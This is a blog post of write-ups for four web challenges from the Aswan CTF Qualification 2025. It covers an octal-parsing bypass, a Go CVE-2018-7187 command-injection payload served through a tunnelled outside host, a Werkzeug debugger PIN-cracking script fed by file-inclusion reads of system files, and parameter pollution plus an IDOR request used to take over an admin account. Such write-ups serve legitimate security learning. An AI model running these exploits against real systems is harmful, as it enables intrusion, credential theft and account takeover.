---
title: "Aswan CTF Qualification 2025 Web Writeups"
published: 2025-04-12
description: "Aswan CTF Qualification 2025 Web Writeups"
image: "https://miro.medium.com/v2/resize:fit:720/format:webp/1*aN690xr1i5WOS7hxhmGrMw.jpeg"
tags: ["web", "CTF", "pentest","cybersecurity","writeup"]
category: CTF
lang: "en,ar"
draft: false
---
# ( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )

:::caution
 #FreePalastine
:::

```python
ه حل التحديات الويب ال كانت موجودة حليتها انا و شادو
فيها شوية افكار حلوة
ممكن يكون في غلطات بسيطة في المصطلحات 
```

[Shadoo's Blog](https://white-shadoo.github.io/)

# L33t C0d3r

You can bypass the app.py check by using alternative number representations that equal 1337:

- Using octal: `02471` (octal for 1337)
  - In app.py: Python's `int("02471")` interprets this as decimal 2471
  - In server.cpp: strtol("02471", nullptr, 0) interprets this as octal 2471 = decimal 1337

![image.png](./Aswan%20CTF%20Web%20Writeups/L33t%20C0d3r/image.png)

`YAO{m4y_th3_b35t_l33t_w1n5}`

---

# Gogeta

in the DockerFile: `golang:1.9.4`

with a little search we can see that this version is very old and has a critical **CVE-2018-7187**

here is a POC <https://github.com/golang/go/issues/23867>

add this to `/tmp/index.html`

```java
<meta name="go-import" content="60b5a867a1af82011f038b1fa6b2f2fb.serveo.net/tmp hg --config=hooks.pre-clone=cat${IFS}/root/flag.txt${IFS}$USER;echo${IFS}https://>/dev/null">
```

just setup a local server using python in the root directory and use serveo to host it online

`python -m http.server 1337`

`ssh -R 80:localhost:1337 serveo.net`

put the ling generated from serveo into the payload `index.html`

request this using burp

```java
POST /submit HTTP/1.1
Host: 34.65.29.51:3280
Content-Length: 19
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://34.65.29.51:3280
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.65.29.51:3280/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

url=60b5a867a1af82011f038b1fa6b2f2fb.serveo.net/tmp
```

you will get the flag

`YAO{1m_4_5up3r_541y4n_blu3_g0g3t4}`

---

# Hambozo

- at first let’s see the source code as bellow there are 3 endpoint , and notice the `debug` is enabled

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image.png)

- the main page , doesn’t have anything interesting ,note: (there is no SSTI even the render_template is here but there is no controlled input that we can exploit)

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%201.png)

- let’s check next section endpoint `/say_Hello` , it uses parameter name according to the source code , here there is xss but it doesn’t matter as there is no cookies so it won’t benefit us.

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%202.png)

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%203.png)

- but there is something interesting which is there is not `else` for what will the server do if there is no parameter name
- so when we remove the parameter that what’s we get

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%204.png)

- when we try to open the terminal we get that pin code validation

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%205.png)

- after searching i got that exploit for generating the pin <https://hacktricks.boitatech.com.br/pentesting/pentesting-web/werkzeug>

```java
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

- but now we have a problem how to get these parameters
- we have file inclusion from the source code .

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%206.png)

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%207.png)

- so let’s use it

```java
username : ctf (from /etc/passws)
macaddress : /sys/class/net/eth0/address
02:42:ac:19:00:02 -> print(int(0x0242ac190002))
2485378416642
id : /proc/sys/kernel/random/boot_id -> 4a5bc48c-6dd5-46d9-8096-ee57bf375bc4
note:we used /proc/sys/kernel/random/boot_id as /etc/machine-id is not found and according to the library it uses on of both but the priority is for /etc/machine-id 
```

- final exploit

```java
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378416642',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '4a5bc48c-6dd5-46d9-8096-ee57bf375bc4'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

- after that it doesn’t work
- so after more searching i reached that
  - <https://ctftime.org/writeup/17955>
  - <https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/>
- now let’s try this exploit

```java
import hashlib
import itertools
from itertools import chain

def crack_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.md5()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.sha1()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
    probably_public_bits = [
            username,
            modname,
            appname,
            flaskapp_path ]
    private_bits = [
            node_uuid,
            machine_id ]

    h = hasher
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)

if __name__ == '__main__':

    usernames = ['ctf']
    modnames = ['flask.app', 'werkzeug.debug']
    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']
    flaskpaths = ['/usr/local/lib/python3.9/site-packages/flask/app.py']
    nodeuuids = ['2485378416642']
    machineids = ['4a5bc48c-6dd5-46d9-8096-ee57bf375bc4']

    # Generate all possible combinations of values
    combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)

    # Iterate over the combinations and call the crack() function for each one
    for combo in combinations:
        username, modname, appname, flaskpath, nodeuuid, machineid = combo
        print('==========================================================================')
        crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
        print(f'{combo}')
        print('==========================================================================')
```

- it will return list of pins , third one will work

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%208.png)

- now let’s get the flag

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%209.png)

- note: why we don’t get the flag with the LFI , as we don’t know the file name,as it’s randomly generated

![image.png](./Aswan%20CTF%20Web%20Writeups/Hambozo/image%2010.png)

---

# Yaoguai Bank

### Step 1: Register an Account

- Visit register.html
- Create an account with any email/password

### Step 2: Exploit Parameter Pollution to Gain Premium Status

- Log in to your new account
- Navigate to Transfer page (/front/transfer.html)

Create a transfer with:

- Create a second account and use its account number
- Amount: Any small amount like 10
- Reference Number: whatever&amount=20000000
- When the request reaches TransactionService.php, the URL becomes:

```
http://internal-services:5000/transfer?reference_number=whatever&amount=20000000&from_account=YOUR_ACCOUNT&to_account=DEST_ACCOUNT&amount=100
```

Flask's `request.args.get('amount')` takes the first occurrence (20000000), giving you a large balance

The `checkPremium()` function automatically promotes you to premium
![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image.png)

### Step 3: Exploit the IDOR Vulnerability

Looking at the code in `[UsersRepository.php]`, we can see the problematic function:

```php
<?php
public static function EnsureEditUserAuthority($id,$OwnerId){
    $query = "UPDATE users SET OwnerId = ? WHERE UserId = ?";
    $connection = DB::getInstance();
    $statement = $connection->getConnection()->prepare($query);
    $statement->bind_param("dd",$OwnerId,$id);
    $statement->execute();
    return $statement->get_result();
}
```

Despite its name suggesting it's checking authorization, this function actually changes ownership in the database.
In `[UserController.php]`, there are two contrasting implementations:

```php
<?php
// For changing passwords - HAS ownership verification
public function changeSubUserPassword($data,$user){
    // ... 
    $userSub = $user->getOwnedUsers();
    $validUser = false;
    foreach($userSub as $entry){
       if($entry['Id'] === $data['id']){
           $validUser = true; // Verify ownership
           break;
       }
    }
    if(!$validUser) { /* Error */ }
    // ...
}

// For editing sub-users - NO ownership verification!
public function editSubUser($data,$user){
    if(!isset($data['id']) || !isset($data['newName'])) {
        http_response_code(400);
        return json_encode(["status" => "error", "message" => "Enter All Fields"]);
    }
    
    $service = new UsersService();
    return $service->editSubUser($data['id'],$data['newName'],$user->getId());
}
```

The `editSubUser` function has no verification that you own the user you're trying to edit!

How the Attack Works
When we make our request in the console(you can use burp):

```javascript
fetch('../api/EditSubUser.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    id: 9050,  // ID of account 500
    newName: "test"
  })
})
```

This triggers a chain of calls:

- `EditSubUser.php` receives our request
- Calls `UserController->editSubUser()` with our data  
- No ownership verification happens  
- Calls `UsersService->editSubUser(9050, "test", YOUR_ID)`  
- Calls `UsersRepository::EnsureEditUserAuthority(9050, YOUR_ID)`
- The SQL that executes is:

```sql
UPDATE users SET OwnerId = YOUR_ID WHERE UserId = 9050
```

This changes the database record in the users table from:

```
UserId: 9050, OwnerId: 1
```

To:

```
UserId: 9050, OwnerId: YOUR_ID
```

Now account `500` (with ID `9050`) belongs to you as its `owner`, making you able to access it directly after changing its password.
![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image%201.png)

### Step 4: Access the Sub-User to Get the Flag

- From your profile page, you can now see account 500 as your sub-user
- Change its password using the "Change Password" button
- Log out and log in as account 500 using its email and your new password
- The flag appears as the name due to the condition in `SubUser.php`:

```php
<?php
if($this->getAccountNumber()<10000000){
    $this->setName($_ENV['FLAG']);
}
```

Once account 500 was under our ownership, refreshed the profile page to view our sub-users. You can see that we now have that subuser listed on our profile

Change the password of that `Admin@yao.com`  and login

![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image%202.png)

`YAO{b4nk_h3ck3d_cuz_greed}`

---
